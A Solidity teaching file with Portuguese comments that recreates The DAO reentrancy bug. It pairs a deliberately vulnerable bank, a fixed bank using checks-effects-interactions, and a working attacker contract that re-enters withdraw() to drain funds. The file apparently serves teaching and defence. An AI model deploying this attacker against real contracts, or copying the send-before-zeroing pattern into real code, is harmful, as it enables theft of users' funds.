// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// =============================================================================
//  O bug da The DAO (2016) em ~15 linhas.
//  Compile este arquivo uma vez; os 3 contratos aparecem no dropdown de deploy.
//  Roteiro completo: ver README.md (Receita 3).
// =============================================================================

/// BANCO VULNERÁVEL — envia o ETH ANTES de zerar o saldo.
contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0, "saldo zero");
        (bool ok, ) = msg.sender.call{value: bal}(""); // 1) ENVIA primeiro...
        require(ok, "falha no envio");
        balances[msg.sender] = 0;                       // 2) ...zera tarde demais
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

/// BANCO SEGURO — mesma lógica, mas zera o saldo ANTES de enviar.
/// Padrão checks-effects-interactions: a única diferença está na ORDEM.
contract SafeBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0, "saldo zero");
        balances[msg.sender] = 0;                       // 1) zera primeiro
        (bool ok, ) = msg.sender.call{value: bal}("");  // 2) envia por ultimo
        require(ok, "falha no envio");
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// ATACANTE — funciona contra qualquer banco (basta o endereço).
contract Attacker {
    IBank   public bank;
    address public owner;

    constructor(address _bank) {
        bank  = IBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "envie >= 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // O banco nos envia ETH => esta função dispara => re-entramos no withdraw
    // ANTES de o saldo ter sido zerado (no banco vulnerável).
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "somente o dono");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "falha no envio");
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
